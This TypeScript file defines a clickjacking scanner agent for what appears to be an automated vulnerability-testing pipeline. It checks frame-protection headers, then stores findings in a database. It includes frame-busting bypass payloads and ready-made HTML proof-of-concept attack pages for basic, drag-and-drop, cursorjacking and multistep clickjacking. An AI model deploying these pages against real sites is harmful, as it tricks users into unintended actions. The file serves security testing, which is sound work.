/**
 * Clickjacking Agent
 * Based on PayloadsAllTheThings/Clickjacking
 * 
 * Detects and exploits clickjacking vulnerabilities:
 * - Missing X-Frame-Options header
 * - Weak CSP frame-ancestors
 * - Frame busting bypass techniques
 * - Drag-and-drop clickjacking
 * - Cursorjacking
 * - Likejacking (social media)
 * - Strokejacking (keyboard input)
 */

import { Job } from 'bullmq';
import { BaseAgent } from './base';
import logger from '../utils/logger';
import database from '../services/database';

interface ClickjackingJob {
  programId: string;
  scanId: string;
  urls: string[];
  options?: {
    generatePOC?: boolean;
    testFrameBusting?: boolean;
    testDragDrop?: boolean;
  };
}

interface ClickjackingResult {
  url: string;
  vulnerable: boolean;
  type: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  details: {
    xFrameOptions?: string;
    csp?: string;
    frameBustingBypass?: string;
  };
  poc?: string;
}

export class ClickjackingAgent extends BaseAgent<ClickjackingJob> {
  // Frame busting bypass techniques from PayloadsAllTheThings
  private readonly frameBustingBypasses = [
    // Double framing
    '<iframe src="outer.html"><iframe src="TARGET"></iframe></iframe>',
    // Sandbox attribute
    '<iframe sandbox="allow-forms allow-scripts" src="TARGET"></iframe>',
    // onBeforeUnload blocking
    'window.onbeforeunload = function(){ return "Stay here!"; };',
    // XSS filter abuse (IE)
    '<iframe src="TARGET?<script>top=self</script>"></iframe>',
    // Restricted zone (IE)
    '<iframe security="restricted" src="TARGET"></iframe>',
    // Design mode
    'document.designMode = "on";',
  ];

  // POC templates
  private readonly pocTemplates = {
    basic: `<!DOCTYPE html>
<html>
<head><title>Clickjacking POC</title></head>
<body>
<h1>Click the button below!</h1>
<div style="position:relative;">
  <button style="position:absolute;top:0;left:0;width:300px;height:50px;opacity:0.5;">
    Win a Prize!
  </button>
  <iframe src="TARGET_URL" style="position:absolute;top:0;left:0;width:300px;height:50px;opacity:0.1;"></iframe>
</div>
</body>
</html>`,

    dragDrop: `<!DOCTYPE html>
<html>
<head><title>Drag & Drop Clickjacking POC</title></head>
<body>
<div id="drag" draggable="true" ondragstart="event.dataTransfer.setData('text/plain','malicious data')">
  Drag me to the box!
</div>
<iframe src="TARGET_URL" style="width:500px;height:500px;opacity:0.3;"></iframe>
</body>
</html>`,

    cursorjacking: `<!DOCTYPE html>
<html>
<head>
<style>
body { cursor: none; }
#fakeCursor { position: absolute; z-index: 9999; pointer-events: none; }
</style>
</head>
<body>
<img id="fakeCursor" src="cursor.png">
<iframe src="TARGET_URL" style="position:absolute;top:0;left:0;width:100%;height:100%;"></iframe>
<script>
document.onmousemove = function(e) {
  document.getElementById('fakeCursor').style.left = (e.pageX + 20) + 'px';
  document.getElementById('fakeCursor').style.top = (e.pageY + 20) + 'px';
};
</script>
</body>
</html>`,

    multistep: `<!DOCTYPE html>
<html>
<head><title>Multi-Step Clickjacking</title></head>
<body>
<div id="step1" style="position:relative;">
  <button onclick="showStep2()">Step 1: Click Here</button>
  <iframe src="TARGET_URL_STEP1" style="opacity:0.1;position:absolute;top:0;left:0;"></iframe>
</div>
<div id="step2" style="display:none;position:relative;">
  <button>Step 2: Confirm</button>
  <iframe src="TARGET_URL_STEP2" style="opacity:0.1;position:absolute;top:0;left:0;"></iframe>
</div>
<script>
function showStep2() { document.getElementById('step2').style.display='block'; }
</script>
</body>
</html>`,
  };

  constructor() {
    super('clickjacking');
  }

  protected getSteps() {
    return [
      { name: 'Check X-Frame-Options headers', metadata: {} },
      { name: 'Analyze CSP frame-ancestors', metadata: {} },
      { name: 'Test frame busting bypasses', metadata: {} },
      { name: 'Generate POC exploits', metadata: {} },
      { name: 'Store findings', metadata: {} },
    ];
  }

  async process(job: Job<ClickjackingJob>): Promise<any> {
    const { programId, scanId, urls, options = {} } = job.data;
    const results: ClickjackingResult[] = [];

    this.updateProgress(job, 0, 'Starting clickjacking analysis');

    for (let i = 0; i < urls.length; i++) {
      const url = urls[i];
      try {
        const result = await this.testClickjacking(url, options);
        if (result.vulnerable) {
          results.push(result);
          
          // Store finding
          await this.storeFinding(programId, scanId, result);
        }
      } catch (error) {
        logger.error({ error, url }, 'Error testing clickjacking');
      }

      this.updateProgress(job, ((i + 1) / urls.length) * 100, `Tested ${i + 1}/${urls.length} URLs`);
    }

    // Publish findings via dynamic router
    for (const result of results) {
      await this.publishSignal(
        job.id!,
        programId,
        'vulnerability_potential',
        {
          type: 'clickjacking',
          subtype: result.type,
          url: result.url,
          severity: result.severity,
          evidence: result.details,
          poc: result.poc,
          source: 'clickjacking-agent',
        },
        result.severity === 'critical' ? 1.0 : result.severity === 'high' ? 0.9 : 0.8
      );
    }

    return {
      totalUrls: urls.length,
      vulnerableUrls: results.length,
      findings: results,
    };
  }

  private async testClickjacking(url: string, options: any): Promise<ClickjackingResult> {
    const result: ClickjackingResult = {
      url,
      vulnerable: false,
      type: 'none',
      severity: 'low',
      details: {},
    };

    try {
      // Fetch headers
      const response = await fetch(url, { method: 'GET', redirect: 'follow' });
      const headers = Object.fromEntries(response.headers.entries());

      // Check X-Frame-Options
      const xfo = headers['x-frame-options']?.toLowerCase();
      result.details.xFrameOptions = xfo || 'missing';

      // Check CSP frame-ancestors
      const csp = headers['content-security-policy'] || '';
      const frameAncestors = csp.match(/frame-ancestors\s+([^;]+)/i)?.[1];
      result.details.csp = frameAncestors || 'missing';

      // Determine vulnerability
      if (!xfo && !frameAncestors) {
        result.vulnerable = true;
        result.type = 'no-protection';
        result.severity = 'medium';
      } else if (xfo === 'allowall' || frameAncestors?.includes('*')) {
        result.vulnerable = true;
        result.type = 'weak-policy';
        result.severity = 'medium';
      } else if (xfo === 'allow-from' && !frameAncestors) {
        // ALLOW-FROM is deprecated and not supported in modern browsers
        result.vulnerable = true;
        result.type = 'deprecated-allow-from';
        result.severity = 'low';
      }

      // Test frame busting bypasses if enabled
      if (options.testFrameBusting && result.vulnerable) {
        const body = await response.text();
        const bypassResult = this.testFrameBustingBypasses(body);
        if (bypassResult) {
          result.details.frameBustingBypass = bypassResult;
          result.severity = 'high';
        }
      }

      // Generate POC if enabled
      if (options.generatePOC && result.vulnerable) {
        result.poc = this.generatePOC(url, result.type);
      }

    } catch (error) {
      logger.debug({ error, url }, 'Error fetching URL for clickjacking test');
    }

    return result;
  }

  private testFrameBustingBypasses(html: string): string | null {
    // Check for common frame busting code
    const frameBustingPatterns = [
      /if\s*\(\s*top\s*!==?\s*self\s*\)/i,
      /if\s*\(\s*parent\s*!==?\s*window\s*\)/i,
      /if\s*\(\s*window\.top\s*!==?\s*window\s*\)/i,
      /top\.location\s*=\s*self\.location/i,
      /top\.location\s*=\s*location/i,
    ];

    for (const pattern of frameBustingPatterns) {
      if (pattern.test(html)) {
        // Frame busting detected, check for bypasses
        if (html.includes('sandbox')) {
          return 'sandbox-bypass';
        }
        if (!html.includes('style') || !html.includes('display')) {
          return 'no-visual-protection';
        }
        return 'frame-busting-detected-but-bypassable';
      }
    }

    return null;
  }

  private generatePOC(url: string, type: string): string {
    let template = this.pocTemplates.basic;
    
    if (type === 'drag-drop') {
      template = this.pocTemplates.dragDrop;
    } else if (type === 'cursorjacking') {
      template = this.pocTemplates.cursorjacking;
    }

    return template.replace(/TARGET_URL/g, url).replace(/TARGET/g, url);
  }

  private async storeFinding(programId: string, scanId: string, result: ClickjackingResult): Promise<void> {
    try {
      await database.query(
        `INSERT INTO vulnerabilities (program_id, scan_id, type, url, severity, details, poc, created_at)
         VALUES ($1, $2, $3, $4, $5, $6, $7, CURRENT_TIMESTAMP)`,
        [programId, scanId, 'clickjacking', result.url, result.severity, JSON.stringify(result.details), result.poc]
      );
    } catch (error) {
      logger.error({ error }, 'Failed to store clickjacking finding');
    }
  }
}

export default new ClickjackingAgent();
